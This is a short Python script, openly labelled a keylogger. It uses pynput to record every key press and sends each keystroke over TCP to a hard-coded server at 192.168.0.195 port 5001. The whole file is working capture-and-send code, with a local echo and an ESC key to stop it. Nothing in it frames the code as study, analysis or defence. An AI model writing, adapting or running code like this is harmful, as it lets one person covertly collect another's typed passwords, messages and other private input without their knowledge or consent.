import socket
from pynput import keyboard
from datetime import datetime

SERVER_IP = '192.168.0.195'
SERVER_PORT = 5001

# Ensure log file exists


def send_keystroke(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)  # quick fail if server is offline
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(data.encode())
        print(f"[{datetime.now()}] Sent keystroke: {data}")
    except Exception as e:
        print(f"[{datetime.now()}] Failed to send keystroke: {data} (Reason: {e})")

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f'<{key}>'
    print(f"[{datetime.now()}] Key pressed: {k}")
    send_keystroke(k)

def on_release(key):
    if key == keyboard.Key.esc:
        print(f"[{datetime.now()}] ESC pressed, stopping listener.")
        # Stop listener with ESC
        return False

if __name__ == '__main__':
    print(f"[{datetime.now()}] Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() 